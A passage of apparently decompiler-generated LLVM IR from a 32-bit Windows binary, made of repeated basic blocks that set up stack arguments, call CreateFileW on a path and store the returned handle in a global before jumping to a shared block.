  %456 = inttoptr i32 %455 to i32*, !insn.addr !1240
  store i32 ptrtoint (i32* @global_var_100410a0 to i32), i32* %456, align 4, !insn.addr !1240
  %457 = add i32 %esp.3.reload, -40, !insn.addr !1241
  %458 = inttoptr i32 %457 to i32*, !insn.addr !1241
  store i32 2, i32* %458, align 4, !insn.addr !1241
  %459 = add i32 %esp.3.reload, -44, !insn.addr !1242
  %460 = inttoptr i32 %459 to i32*, !insn.addr !1242
  store i32 ptrtoint (i32* @global_var_1003930c to i32), i32* %460, align 4, !insn.addr !1242
  store i32 %452, i32* @global_var_1003e9c0, align 4, !insn.addr !1243
  %461 = add i32 %esp.3.reload, -48, !insn.addr !1244
  %462 = inttoptr i32 %461 to i32*, !insn.addr !1244
  store i32 %452, i32* %462, align 4, !insn.addr !1244
  store i32 %461, i32* %esp.5.reg2mem, !insn.addr !1245
  br label %dec_label_pc_10003625, !insn.addr !1245

dec_label_pc_1000315c:                            ; preds = %dec_label_pc_10002dc4
  %463 = add i32 %esp.3.reload, -4, !insn.addr !1246
  %464 = inttoptr i32 %463 to i32*, !insn.addr !1246
  store i32 0, i32* %464, align 4, !insn.addr !1246
  %465 = add i32 %esp.3.reload, -8, !insn.addr !1247
  %466 = inttoptr i32 %465 to i32*, !insn.addr !1247
  store i32 128, i32* %466, align 4, !insn.addr !1247
  %467 = add i32 %esp.3.reload, -12, !insn.addr !1248
  %468 = inttoptr i32 %467 to i32*, !insn.addr !1248
  store i32 4, i32* %468, align 4, !insn.addr !1248
  %469 = add i32 %esp.3.reload, -16, !insn.addr !1249
  %470 = inttoptr i32 %469 to i32*, !insn.addr !1249
  store i32 0, i32* %470, align 4, !insn.addr !1249
  %471 = add i32 %esp.3.reload, -20, !insn.addr !1250
  %472 = inttoptr i32 %471 to i32*, !insn.addr !1250
  store i32 1, i32* %472, align 4, !insn.addr !1250
  %473 = add i32 %esp.3.reload, -24, !insn.addr !1251
  %474 = inttoptr i32 %473 to i32*, !insn.addr !1251
  store i32 4, i32* %474, align 4, !insn.addr !1251
  %475 = add i32 %esp.3.reload, -28, !insn.addr !1252
  %476 = inttoptr i32 %475 to i32*, !insn.addr !1252
  store i32 ptrtoint (i16** @global_var_10040d98 to i32), i32* %476, align 4, !insn.addr !1252
  %477 = call i32* @CreateFileW(i16* %stack_var_-216.0.reload, i32 ptrtoint (i32* @4 to i32), i32 ptrtoint (i32* @4 to i32), %_SECURITY_ATTRIBUTES* bitcast (i32* @4 to %_SECURITY_ATTRIBUTES*), i32 ptrtoint (i32* @4 to i32), i32 ptrtoint (i32* @4 to i32), i32* nonnull @4), !insn.addr !1253
  %478 = ptrtoint i32* %477 to i32, !insn.addr !1253
  %479 = add i32 %esp.3.reload, -32, !insn.addr !1254
  %480 = inttoptr i32 %479 to i32*, !insn.addr !1254
  store i32 0, i32* %480, align 4, !insn.addr !1254
  %481 = add i32 %esp.3.reload, -36, !insn.addr !1255
  %482 = inttoptr i32 %481 to i32*, !insn.addr !1255
  store i32 ptrtoint (i32* @global_var_100410a0 to i32), i32* %482, align 4, !insn.addr !1255
  %483 = add i32 %esp.3.reload, -40, !insn.addr !1256
  %484 = inttoptr i32 %483 to i32*, !insn.addr !1256
  store i32 2, i32* %484, align 4, !insn.addr !1256
  %485 = add i32 %esp.3.reload, -44, !insn.addr !1257
  %486 = inttoptr i32 %485 to i32*, !insn.addr !1257
  store i32 ptrtoint (i32* @global_var_10039310 to i32), i32* %486, align 4, !insn.addr !1257
  store i32 %478, i32* @global_var_1003e9c0, align 4, !insn.addr !1258
  %487 = add i32 %esp.3.reload, -48, !insn.addr !1259
  %488 = inttoptr i32 %487 to i32*, !insn.addr !1259
  store i32 %478, i32* %488, align 4, !insn.addr !1259
  store i32 %487, i32* %esp.5.reg2mem, !insn.addr !1260
  br label %dec_label_pc_10003625, !insn.addr !1260

dec_label_pc_1000318b:                            ; preds = %dec_label_pc_10002dc4
  %489 = add i32 %esp.3.reload, -4, !insn.addr !1261
  %490 = inttoptr i32 %489 to i32*, !insn.addr !1261
  store i32 0, i32* %490, align 4, !insn.addr !1261
  %491 = add i32 %esp.3.reload, -8, !insn.addr !1262
  %492 = inttoptr i32 %491 to i32*, !insn.addr !1262
  store i32 128, i32* %492, align 4, !insn.addr !1262
  %493 = add i32 %esp.3.reload, -12, !insn.addr !1263
  %494 = inttoptr i32 %493 to i32*, !insn.addr !1263
  store i32 4, i32* %494, align 4, !insn.addr !1263
  %495 = add i32 %esp.3.reload, -16, !insn.addr !1264
  %496 = inttoptr i32 %495 to i32*, !insn.addr !1264
  store i32 0, i32* %496, align 4, !insn.addr !1264
  %497 = add i32 %esp.3.reload, -20, !insn.addr !1265
  %498 = inttoptr i32 %497 to i32*, !insn.addr !1265
  store i32 1, i32* %498, align 4, !insn.addr !1265
  %499 = add i32 %esp.3.reload, -24, !insn.addr !1266
  %500 = inttoptr i32 %499 to i32*, !insn.addr !1266
  store i32 4, i32* %500, align 4, !insn.addr !1266
  %501 = add i32 %esp.3.reload, -28, !insn.addr !1267
  %502 = inttoptr i32 %501 to i32*, !insn.addr !1267
  store i32 ptrtoint (i16** @global_var_10040d98 to i32), i32* %502, align 4, !insn.addr !1267
  %503 = call i32* @CreateFileW(i16* %stack_var_-216.0.reload, i32 ptrtoint (i32* @4 to i32), i32 ptrtoint (i32* @4 to i32), %_SECURITY_ATTRIBUTES* bitcast (i32* @4 to %_SECURITY_ATTRIBUTES*), i32 ptrtoint (i32* @4 to i32), i32 ptrtoint (i32* @4 to i32), i32* nonnull @4), !insn.addr !1268
  %504 = ptrtoint i32* %503 to i32, !insn.addr !1268
  %505 = add i32 %esp.3.reload, -32, !insn.addr !1269
  %506 = inttoptr i32 %505 to i32*, !insn.addr !1269
  store i32 0, i32* %506, align 4, !insn.addr !1269
  %507 = add i32 %esp.3.reload, -36, !insn.addr !1270
  %508 = inttoptr i32 %507 to i32*, !insn.addr !1270
  store i32 ptrtoint (i32* @global_var_100410a0 to i32), i32* %508, align 4, !insn.addr !1270
  %509 = add i32 %esp.3.reload, -40, !insn.addr !1271
  %510 = inttoptr i32 %509 to i32*, !insn.addr !1271
  store i32 2, i32* %510, align 4, !insn.addr !1271
  %511 = add i32 %esp.3.reload, -44, !insn.addr !1272
  %512 = inttoptr i32 %511 to i32*, !insn.addr !1272
  store i32 ptrtoint (i32* @global_var_10039314 to i32), i32* %512, align 4, !insn.addr !1272
  store i32 %504, i32* @global_var_1003e9c0, align 4, !insn.addr !1273
  %513 = add i32 %esp.3.reload, -48, !insn.addr !1274
  %514 = inttoptr i32 %513 to i32*, !insn.addr !1274
  store i32 %504, i32* %514, align 4, !insn.addr !1274
  store i32 %513, i32* %esp.5.reg2mem, !insn.addr !1275
  br label %dec_label_pc_10003625, !insn.addr !1275

dec_label_pc_100031ba:                            ; preds = %dec_label_pc_10002dc4
  %515 = add i32 %esp.3.reload, -4, !insn.addr !1276
  %516 = inttoptr i32 %515 to i32*, !insn.addr !1276
  store i32 0, i32* %516, align 4, !insn.addr !1276
  %517 = add i32 %esp.3.reload, -8, !insn.addr !1277
  %518 = inttoptr i32 %517 to i32*, !insn.addr !1277
  store i32 128, i32* %518, align 4, !insn.addr !1277
  %519 = add i32 %esp.3.reload, -12, !insn.addr !1278
  %520 = inttoptr i32 %519 to i32*, !insn.addr !1278
  store i32 4, i32* %520, align 4, !insn.addr !1278
  %521 = add i32 %esp.3.reload, -16, !insn.addr !1279
  %522 = inttoptr i32 %521 to i32*, !insn.addr !1279
  store i32 0, i32* %522, align 4, !insn.addr !1279
  %523 = add i32 %esp.3.reload, -20, !insn.addr !1280
  %524 = inttoptr i32 %523 to i32*, !insn.addr !1280
  store i32 1, i32* %524, align 4, !insn.addr !1280
  %525 = add i32 %esp.3.reload, -24, !insn.addr !1281
  %526 = inttoptr i32 %525 to i32*, !insn.addr !1281
  store i32 4, i32* %526, align 4, !insn.addr !1281
  %527 = add i32 %esp.3.reload, -28, !insn.addr !1282
  %528 = inttoptr i32 %527 to i32*, !insn.addr !1282
  store i32 ptrtoint (i16** @global_var_10040d98 to i32), i32* %528, align 4, !insn.addr !1282
  %529 = call i32* @CreateFileW(i16* %stack_var_-216.0.reload, i32 ptrtoint (i32* @4 to i32), i32 ptrtoint (i32* @4 to i32), %_SECURITY_ATTRIBUTES* bitcast (i32* @4 to %_SECURITY_ATTRIBUTES*), i32 ptrtoint (i32* @4 to i32), i32 ptrtoint (i32* @4 to i32), i32* nonnull @4), !insn.addr !1283
  %530 = ptrtoint i32* %529 to i32, !insn.addr !1283
  %531 = add i32 %esp.3.reload, -32, !insn.addr !1284
  %532 = inttoptr i32 %531 to i32*, !insn.addr !1284
  store i32 0, i32* %532, align 4, !insn.addr !1284
  %533 = add i32 %esp.3.reload, -36, !insn.addr !1285
  %534 = inttoptr i32 %533 to i32*, !insn.addr !1285
  store i32 ptrtoint (i32* @global_var_100410a0 to i32), i32* %534, align 4, !insn.addr !1285
  %535 = add i32 %esp.3.reload, -40, !insn.addr !1286
  %536 = inttoptr i32 %535 to i32*, !insn.addr !1286
  store i32 2, i32* %536, align 4, !insn.addr !1286
  %537 = add i32 %esp.3.reload, -44, !insn.addr !1287
  %538 = inttoptr i32 %537 to i32*, !insn.addr !1287
  store i32 ptrtoint (i32* @global_var_10039318 to i32), i32* %538, align 4, !insn.addr !1287
  store i32 %530, i32* @global_var_1003e9c0, align 4, !insn.addr !1288
  %539 = add i32 %esp.3.reload, -48, !insn.addr !1289
  %540 = inttoptr i32 %539 to i32*, !insn.addr !1289
  store i32 %530, i32* %540, align 4, !insn.addr !1289
  store i32 %539, i32* %esp.5.reg2mem, !insn.addr !1290
  br label %dec_label_pc_10003625, !insn.addr !1290

dec_label_pc_100031e9:                            ; preds = %dec_label_pc_10002dc4, %dec_label_pc_10002dc4
  %541 = add i32 %esp.3.reload, -4, !insn.addr !1291
  %542 = inttoptr i32 %541 to i32*, !insn.addr !1291
  store i32 0, i32* %542, align 4, !insn.addr !1291
  %543 = add i32 %esp.3.reload, -8, !insn.addr !1292
  %544 = inttoptr i32 %543 to i32*, !insn.addr !1292
  store i32 128, i32* %544, align 4, !insn.addr !1292
  %545 = add i32 %esp.3.reload, -12, !insn.addr !1293
  %546 = inttoptr i32 %545 to i32*, !insn.addr !1293
  store i32 4, i32* %546, align 4, !insn.addr !1293
  %547 = add i32 %esp.3.reload, -16, !insn.addr !1294
  %548 = inttoptr i32 %547 to i32*, !insn.addr !1294
  store i32 0, i32* %548, align 4, !insn.addr !1294
  %549 = add i32 %esp.3.reload, -20, !insn.addr !1295
  %550 = inttoptr i32 %549 to i32*, !insn.addr !1295
  store i32 1, i32* %550, align 4, !insn.addr !1295
  %551 = add i32 %esp.3.reload, -24, !insn.addr !1296
  %552 = inttoptr i32 %551 to i32*, !insn.addr !1296
  store i32 4, i32* %552, align 4, !insn.addr !1296
  %553 = add i32 %esp.3.reload, -28, !insn.addr !1297
  %554 = inttoptr i32 %553 to i32*, !insn.addr !1297
  store i32 ptrtoint (i16** @global_var_10040d98 to i32), i32* %554, align 4, !insn.addr !1297
  %555 = call i32* @CreateFileW(i16* %stack_var_-216.0.reload, i32 ptrtoint (i32* @4 to i32), i32 ptrtoint (i32* @4 to i32), %_SECURITY_ATTRIBUTES* bitcast (i32* @4 to %_SECURITY_ATTRIBUTES*), i32 ptrtoint (i32* @4 to i32), i32 ptrtoint (i32* @4 to i32), i32* nonnull @4), !insn.addr !1298
  %556 = ptrtoint i32* %555 to i32, !insn.addr !1298
  %557 = add i32 %esp.3.reload, -32, !insn.addr !1299
  %558 = inttoptr i32 %557 to i32*, !insn.addr !1299
  store i32 0, i32* %558, align 4, !insn.addr !1299
  %559 = add i32 %esp.3.reload, -36, !insn.addr !1300
  %560 = inttoptr i32 %559 to i32*, !insn.addr !1300
  store i32 ptrtoint (i32* @global_var_100410a0 to i32), i32* %560, align 4, !insn.addr !1300
  %561 = add i32 %esp.3.reload, -40, !insn.addr !1301
  %562 = inttoptr i32 %561 to i32*, !insn.addr !1301
  store i32 2, i32* %562, align 4, !insn.addr !1301
  %563 = add i32 %esp.3.reload, -44, !insn.addr !1302
  %564 = inttoptr i32 %563 to i32*, !insn.addr !1302
  store i32 ptrtoint (i32* @global_var_1003931c to i32), i32* %564, align 4, !insn.addr !1302
  store i32 %556, i32* @global_var_1003e9c0, align 4, !insn.addr !1303
  %565 = add i32 %esp.3.reload, -48, !insn.addr !1304
  %566 = inttoptr i32 %565 to i32*, !insn.addr !1304
  store i32 %556, i32* %566, align 4, !insn.addr !1304
  store i32 %565, i32* %esp.5.reg2mem, !insn.addr !1305
  br label %dec_label_pc_10003625, !insn.addr !1305

dec_label_pc_10003218:                            ; preds = %dec_label_pc_10002dc4
  %567 = add i32 %esp.3.reload, -4, !insn.addr !1306
  %568 = inttoptr i32 %567 to i32*, !insn.addr !1306
  store i32 0, i32* %568, align 4, !insn.addr !1306
  %569 = add i32 %esp.3.reload, -8, !insn.addr !1307
  %570 = inttoptr i32 %569 to i32*, !insn.addr !1307
  store i32 128, i32* %570, align 4, !insn.addr !1307
  %571 = add i32 %esp.3.reload, -12, !insn.addr !1308
  %572 = inttoptr i32 %571 to i32*, !insn.addr !1308
  store i32 4, i32* %572, align 4, !insn.addr !1308
  %573 = add i32 %esp.3.reload, -16, !insn.addr !1309
  %574 = inttoptr i32 %573 to i32*, !insn.addr !1309
  store i32 0, i32* %574, align 4, !insn.addr !1309
  %575 = add i32 %esp.3.reload, -20, !insn.addr !1310
  %576 = inttoptr i32 %575 to i32*, !insn.addr !1310
  store i32 1, i32* %576, align 4, !insn.addr !1310
  %577 = add i32 %esp.3.reload, -24, !insn.addr !1311
  %578 = inttoptr i32 %577 to i32*, !insn.addr !1311
  store i32 4, i32* %578, align 4, !insn.addr !1311
  %579 = add i32 %esp.3.reload, -28, !insn.addr !1312
  %580 = inttoptr i32 %579 to i32*, !insn.addr !1312
  store i32 ptrtoint (i16** @global_var_10040d98 to i32), i32* %580, align 4, !insn.addr !1312
  %581 = call i32* @CreateFileW(i16* %stack_var_-216.0.reload, i32 ptrtoint (i32* @4 to i32), i32 ptrtoint (i32* @4 to i32), %_SECURITY_ATTRIBUTES* bitcast (i32* @4 to %_SECURITY_ATTRIBUTES*), i32 ptrtoint (i32* @4 to i32), i32 ptrtoint (i32* @4 to i32), i32* nonnull @4), !insn.addr !1313
  %582 = ptrtoint i32* %581 to i32, !insn.addr !1313
  %583 = add i32 %esp.3.reload, -32, !insn.addr !1314
  %584 = inttoptr i32 %583 to i32*, !insn.addr !1314
  store i32 0, i32* %584, align 4, !insn.addr !1314
  %585 = add i32 %esp.3.reload, -36, !insn.addr !1315
  %586 = inttoptr i32 %585 to i32*, !insn.addr !1315
  store i32 ptrtoint (i32* @global_var_100410a0 to i32), i32* %586, align 4, !insn.addr !1315
  %587 = add i32 %esp.3.reload, -40, !insn.addr !1316
  %588 = inttoptr i32 %587 to i32*, !insn.addr !1316
  store i32 2, i32* %588, align 4, !insn.addr !1316
  %589 = add i32 %esp.3.reload, -44, !insn.addr !1317
  %590 = inttoptr i32 %589 to i32*, !insn.addr !1317
  store i32 ptrtoint (i32* @global_var_10039320 to i32), i32* %590, align 4, !insn.addr !1317
  store i32 %582, i32* @global_var_1003e9c0, align 4, !insn.addr !1318
  %591 = add i32 %esp.3.reload, -48, !insn.addr !1319
  %592 = inttoptr i32 %591 to i32*, !insn.addr !1319
  store i32 %582, i32* %592, align 4, !insn.addr !1319
  store i32 %591, i32* %esp.5.reg2mem, !insn.addr !1320
  br label %dec_label_pc_10003625, !insn.addr !1320

dec_label_pc_10003247:                            ; preds = %dec_label_pc_10002dc4
  %593 = add i32 %esp.3.reload, -4, !insn.addr !1321
  %594 = inttoptr i32 %593 to i32*, !insn.addr !1321
  store i32 0, i32* %594, align 4, !insn.addr !1321
  %595 = add i32 %esp.3.reload, -8, !insn.addr !1322
  %596 = inttoptr i32 %595 to i32*, !insn.addr !1322
  store i32 128, i32* %596, align 4, !insn.addr !1322
  %597 = add i32 %esp.3.reload, -12, !insn.addr !1323
  %598 = inttoptr i32 %597 to i32*, !insn.addr !1323
  store i32 4, i32* %598, align 4, !insn.addr !1323
  %599 = add i32 %esp.3.reload, -16, !insn.addr !1324
  %600 = inttoptr i32 %599 to i32*, !insn.addr !1324
  store i32 0, i32* %600, align 4, !insn.addr !1324
  %601 = add i32 %esp.3.reload, -20, !insn.addr !1325
  %602 = inttoptr i32 %601 to i32*, !insn.addr !1325
  store i32 1, i32* %602, align 4, !insn.addr !1325
  %603 = add i32 %esp.3.reload, -24, !insn.addr !1326
  %604 = inttoptr i32 %603 to i32*, !insn.addr !1326
  store i32 4, i32* %604, align 4, !insn.addr !1326
  %605 = add i32 %esp.3.reload, -28, !insn.addr !1327
  %606 = inttoptr i32 %605 to i32*, !insn.addr !1327
  store i32 ptrtoint (i16** @global_var_10040d98 to i32), i32* %606, align 4, !insn.addr !1327
  %607 = call i32* @CreateFileW(i16* %stack_var_-216.0.reload, i32 ptrtoint (i32* @4 to i32), i32 ptrtoint (i32* @4 to i32), %_SECURITY_ATTRIBUTES* bitcast (i32* @4 to %_SECURITY_ATTRIBUTES*), i32 ptrtoint (i32* @4 to i32), i32 ptrtoint (i32* @4 to i32), i32* nonnull @4), !insn.addr !1328
  %608 = ptrtoint i32* %607 to i32, !insn.addr !1328
  %609 = add i32 %esp.3.reload, -32, !insn.addr !1329
  %610 = inttoptr i32 %609 to i32*, !insn.addr !1329
  store i32 0, i32* %610, align 4, !insn.addr !1329
  %611 = add i32 %esp.3.reload, -36, !insn.addr !1330
  %612 = inttoptr i32 %611 to i32*, !insn.addr !1330
  store i32 ptrtoint (i32* @global_var_100410a0 to i32), i32* %612, align 4, !insn.addr !1330
  %613 = add i32 %esp.3.reload, -40, !insn.addr !1331
  %614 = inttoptr i32 %613 to i32*, !insn.addr !1331
  store i32 2, i32* %614, align 4, !insn.addr !1331
  %615 = add i32 %esp.3.reload, -44, !insn.addr !1332
  %616 = inttoptr i32 %615 to i32*, !insn.addr !1332
  store i32 ptrtoint (i32* @global_var_10039324 to i32), i32* %616, align 4, !insn.addr !1332
  store i32 %608, i32* @global_var_1003e9c0, align 4, !insn.addr !1333
  %617 = add i32 %esp.3.reload, -48, !insn.addr !1334
  %618 = inttoptr i32 %617 to i32*, !insn.addr !1334
  store i32 %608, i32* %618, align 4, !insn.addr !1334
  store i32 %617, i32* %esp.5.reg2mem, !insn.addr !1335
  br label %dec_label_pc_10003625, !insn.addr !1335

dec_label_pc_10003276:                            ; preds = %dec_label_pc_10002dc4
  %619 = add i32 %esp.3.reload, -4, !insn.addr !1336
  %620 = inttoptr i32 %619 to i32*, !insn.addr !1336
  store i32 0, i32* %620, align 4, !insn.addr !1336
  %621 = add i32 %esp.3.reload, -8, !insn.addr !1337
  %622 = inttoptr i32 %621 to i32*, !insn.addr !1337
  store i32 128, i32* %622, align 4, !insn.addr !1337
  %623 = add i32 %esp.3.reload, -12, !insn.addr !1338
  %624 = inttoptr i32 %623 to i32*, !insn.addr !1338
  store i32 4, i32* %624, align 4, !insn.addr !1338
  %625 = add i32 %esp.3.reload, -16, !insn.addr !1339
  %626 = inttoptr i32 %625 to i32*, !insn.addr !1339
  store i32 0, i32* %626, align 4, !insn.addr !1339
  %627 = add i32 %esp.3.reload, -20, !insn.addr !1340
  %628 = inttoptr i32 %627 to i32*, !insn.addr !1340
  store i32 1, i32* %628, align 4, !insn.addr !1340
  %629 = add i32 %esp.3.reload, -24, !insn.addr !1341
  %630 = inttoptr i32 %629 to i32*, !insn.addr !1341
  store i32 4, i32* %630, align 4, !insn.addr !1341
  %631 = add i32 %esp.3.reload, -28, !insn.addr !1342
  %632 = inttoptr i32 %631 to i32*, !insn.addr !1342
  store i32 ptrtoint (i16** @global_var_10040d98 to i32), i32* %632, align 4, !insn.addr !1342
  %633 = call i32* @CreateFileW(i16* %stack_var_-216.0.reload, i32 ptrtoint (i32* @4 to i32), i32 ptrtoint (i32* @4 to i32), %_SECURITY_ATTRIBUTES* bitcast (i32* @4 to %_SECURITY_ATTRIBUTES*), i32 ptrtoint (i32* @4 to i32), i32 ptrtoint (i32* @4 to i32), i32* nonnull @4), !insn.addr !1343
  %634 = ptrtoint i32* %633 to i32, !insn.addr !1343
  %635 = add i32 %esp.3.reload, -32, !insn.addr !1344
  %636 = inttoptr i32 %635 to i32*, !insn.addr !1344
  store i32 0, i32* %636, align 4, !insn.addr !1344
  %637 = add i32 %esp.3.reload, -36, !insn.addr !1345
  %638 = inttoptr i32 %637 to i32*, !insn.addr !1345
  store i32 ptrtoint (i32* @global_var_100410a0 to i32), i32* %638, align 4, !insn.addr !1345
  %639 = add i32 %esp.3.reload, -40, !insn.addr !1346
  %640 = inttoptr i32 %639 to i32*, !insn.addr !1346
  store i32 2, i32* %640, align 4, !insn.addr !1346
  %641 = add i32 %esp.3.reload, -44, !insn.addr !1347
  %642 = inttoptr i32 %641 to i32*, !insn.addr !1347
  store i32 ptrtoint (i32* @global_var_10039328 to i32), i32* %642, align 4, !insn.addr !1347
  store i32 %634, i32* @global_var_1003e9c0, align 4, !insn.addr !1348
  %643 = add i32 %esp.3.reload, -48, !insn.addr !1349
  %644 = inttoptr i32 %643 to i32*, !insn.addr !1349
  store i32 %634, i32* %644, align 4, !insn.addr !1349
  store i32 %643, i32* %esp.5.reg2mem, !insn.addr !1350
  br label %dec_label_pc_10003625, !insn.addr !1350

dec_label_pc_100032a5:                            ; preds = %dec_label_pc_10002dc4
  %645 = add i32 %esp.3.reload, -4, !insn.addr !1351
  %646 = inttoptr i32 %645 to i32*, !insn.addr !1351
  store i32 0, i32* %646, align 4, !insn.addr !1351
  %647 = add i32 %esp.3.reload, -8, !insn.addr !1352
  %648 = inttoptr i32 %647 to i32*, !insn.addr !1352
  store i32 128, i32* %648, align 4, !insn.addr !1352
  %649 = add i32 %esp.3.reload, -12, !insn.addr !1353
  %650 = inttoptr i32 %649 to i32*, !insn.addr !1353
  store i32 4, i32* %650, align 4, !insn.addr !1353
  %651 = add i32 %esp.3.reload, -16, !insn.addr !1354
  %652 = inttoptr i32 %651 to i32*, !insn.addr !1354
  store i32 0, i32* %652, align 4, !insn.addr !1354
  %653 = add i32 %esp.3.reload, -20, !insn.addr !1355
  %654 = inttoptr i32 %653 to i32*, !insn.addr !1355
  store i32 1, i32* %654, align 4, !insn.addr !1355
  %655 = add i32 %esp.3.reload, -24, !insn.addr !1356
  %656 = inttoptr i32 %655 to i32*, !insn.addr !1356
  store i32 4, i32* %656, align 4, !insn.addr !1356
  %657 = add i32 %esp.3.reload, -28, !insn.addr !1357
  %658 = inttoptr i32 %657 to i32*, !insn.addr !1357
  store i32 ptrtoint (i16** @global_var_10040d98 to i32), i32* %658, align 4, !insn.addr !1357
  %659 = call i32* @CreateFileW(i16* %stack_var_-216.0.reload, i32 ptrtoint (i32* @4 to i32), i32 ptrtoint (i32* @4 to i32), %_SECURITY_ATTRIBUTES* bitcast (i32* @4 to %_SECURITY_ATTRIBUTES*), i32 ptrtoint (i32* @4 to i32), i32 ptrtoint (i32* @4 to i32), i32* nonnull @4), !insn.addr !1358
  %660 = ptrtoint i32* %659 to i32, !insn.addr !1358
  %661 = add i32 %esp.3.reload, -32, !insn.addr !1359
  %662 = inttoptr i32 %661 to i32*, !insn.addr !1359
  store i32 0, i32* %662, align 4, !insn.addr !1359
  %663 = add i32 %esp.3.reload, -36, !insn.addr !1360
  %664 = inttoptr i32 %663 to i32*, !insn.addr !1360
  store i32 ptrtoint (i32* @global_var_100410a0 to i32), i32* %664, align 4, !insn.addr !1360
  %665 = add i32 %esp.3.reload, -40, !insn.addr !1361
  %666 = inttoptr i32 %665 to i32*, !insn.addr !1361
  store i32 2, i32* %666, align 4, !insn.addr !1361
  %667 = add i32 %esp.3.reload, -44, !insn.addr !1362
  %668 = inttoptr i32 %667 to i32*, !insn.addr !1362
  store i32 ptrtoint (i32* @global_var_1003932c to i32), i32* %668, align 4, !insn.addr !1362
  store i32 %660, i32* @global_var_1003e9c0, align 4, !insn.addr !1363
  %669 = add i32 %esp.3.reload, -48, !insn.addr !1364
  %670 = inttoptr i32 %669 to i32*, !insn.addr !1364
  store i32 %660, i32* %670, align 4, !insn.addr !1364
  store i32 %669, i32* %esp.5.reg2mem, !insn.addr !1365
  br label %dec_label_pc_10003625, !insn.addr !1365

dec_label_pc_100032d4:                            ; preds = %dec_label_pc_10002dc4
  %671 = add i32 %esp.3.reload, -4, !insn.addr !1366
  %672 = inttoptr i32 %671 to i32*, !insn.addr !1366
  store i32 0, i32* %672, align 4, !insn.addr !1366
  %673 = add i32 %esp.3.reload, -8, !insn.addr !1367
  %674 = inttoptr i32 %673 to i32*, !insn.addr !1367
  store i32 128, i32* %674, align 4, !insn.addr !1367
  %675 = add i32 %esp.3.reload, -12, !insn.addr !1368
  %676 = inttoptr i32 %675 to i32*, !insn.addr !1368
  store i32 4, i32* %676, align 4, !insn.addr !1368
  %677 = add i32 %esp.3.reload, -16, !insn.addr !1369
  %678 = inttoptr i32 %677 to i32*, !insn.addr !1369
  store i32 0, i32* %678, align 4, !insn.addr !1369
  %679 = add i32 %esp.3.reload, -20, !insn.addr !1370
  %680 = inttoptr i32 %679 to i32*, !insn.addr !1370
  store i32 1, i32* %680, align 4, !insn.addr !1370
  %681 = add i32 %esp.3.reload, -24, !insn.addr !1371
  %682 = inttoptr i32 %681 to i32*, !insn.addr !1371
  store i32 4, i32* %682, align 4, !insn.addr !1371
  %683 = add i32 %esp.3.reload, -28, !insn.addr !1372
  %684 = inttoptr i32 %683 to i32*, !insn.addr !1372
  store i32 ptrtoint (i16** @global_var_10040d98 to i32), i32* %684, align 4, !insn.addr !1372
  %685 = call i32* @CreateFileW(i16* %stack_var_-216.0.reload, i32 ptrtoint (i32* @4 to i32), i32 ptrtoint (i32* @4 to i32), %_SECURITY_ATTRIBUTES* bitcast (i32* @4 to %_SECURITY_ATTRIBUTES*), i32 ptrtoint (i32* @4 to i32), i32 ptrtoint (i32* @4 to i32), i32* nonnull @4), !insn.addr !1373
  %686 = ptrtoint i32* %685 to i32, !insn.addr !1373
  %687 = add i32 %esp.3.reload, -32, !insn.addr !1374
  %688 = inttoptr i32 %687 to i32*, !insn.addr !1374
  store i32 0, i32* %688, align 4, !insn.addr !1374
  %689 = add i32 %esp.3.reload, -36, !insn.addr !1375
  %690 = inttoptr i32 %689 to i32*, !insn.addr !1375
  store i32 ptrtoint (i32* @global_var_100410a0 to i32), i32* %690, align 4, !insn.addr !1375
  %691 = add i32 %esp.3.reload, -40, !insn.addr !1376
  %692 = inttoptr i32 %691 to i32*, !insn.addr !1376
  store i32 2, i32* %692, align 4, !insn.addr !1376
  %693 = add i32 %esp.3.reload, -44, !insn.addr !1377
  %694 = inttoptr i32 %693 to i32*, !insn.addr !1377
  store i32 ptrtoint (i32* @global_var_10039330 to i32), i32* %694, align 4, !insn.addr !1377
  store i32 %686, i32* @global_var_1003e9c0, align 4, !insn.addr !1378
  %695 = add i32 %esp.3.reload, -48, !insn.addr !1379
  %696 = inttoptr i32 %695 to i32*, !insn.addr !1379
  store i32 %686, i32* %696, align 4, !insn.addr !1379
  store i32 %695, i32* %esp.5.reg2mem, !insn.addr !1380
  br label %dec_label_pc_10003625, !insn.addr !1380

dec_label_pc_10003303:                            ; preds = %dec_label_pc_10002dc4
  %697 = add i32 %esp.3.reload, -4, !insn.addr !1381
  %698 = inttoptr i32 %697 to i32*, !insn.addr !1381
  store i32 0, i32* %698, align 4, !insn.addr !1381
  %699 = add i32 %esp.3.reload, -8, !insn.addr !1382
  %700 = inttoptr i32 %699 to i32*, !insn.addr !1382
  store i32 128, i32* %700, align 4, !insn.addr !1382
  %701 = add i32 %esp.3.reload, -12, !insn.addr !1383
  %702 = inttoptr i32 %701 to i32*, !insn.addr !1383
  store i32 4, i32* %702, align 4, !insn.addr !1383
  %703 = add i32 %esp.3.reload, -16, !insn.addr !1384
  %704 = inttoptr i32 %703 to i32*, !insn.addr !1384
  store i32 0, i32* %704, align 4, !insn.addr !1384
  %705 = add i32 %esp.3.reload, -20, !insn.addr !1385
  %706 = inttoptr i32 %705 to i32*, !insn.addr !1385
  store i32 1, i32* %706, align 4, !insn.addr !1385
  %707 = add i32 %esp.3.reload, -24, !insn.addr !1386
  %708 = inttoptr i32 %707 to i32*, !insn.addr !1386
  store i32 4, i32* %708, align 4, !insn.addr !1386
  %709 = add i32 %esp.3.reload, -28, !insn.addr !1387
  %710 = inttoptr i32 %709 to i32*, !insn.addr !1387
  store i32 ptrtoint (i16** @global_var_10040d98 to i32), i32* %710, align 4, !insn.addr !1387
  %711 = call i32* @CreateFileW(i16* %stack_var_-216.0.reload, i32 ptrtoint (i32* @4 to i32), i32 ptrtoint (i32* @4 to i32), %_SECURITY_ATTRIBUTES* bitcast (i32* @4 to %_SECURITY_ATTRIBUTES*), i32 ptrtoint (i32* @4 to i32), i32 ptrtoint (i32* @4 to i32), i32* nonnull @4), !insn.addr !1388
  %712 = ptrtoint i32* %711 to i32, !insn.addr !1388
  %713 = add i32 %esp.3.reload, -32, !insn.addr !1389
  %714 = inttoptr i32 %713 to i32*, !insn.addr !1389
  store i32 0, i32* %714, align 4, !insn.addr !1389
  %715 = add i32 %esp.3.reload, -36, !insn.addr !1390
  %716 = inttoptr i32 %715 to i32*, !insn.addr !1390
  store i32 ptrtoint (i32* @global_var_100410a0 to i32), i32* %716, align 4, !insn.addr !1390
  %717 = add i32 %esp.3.reload, -40, !insn.addr !1391
  %718 = inttoptr i32 %717 to i32*, !insn.addr !1391
  store i32 2, i32* %718, align 4, !insn.addr !1391
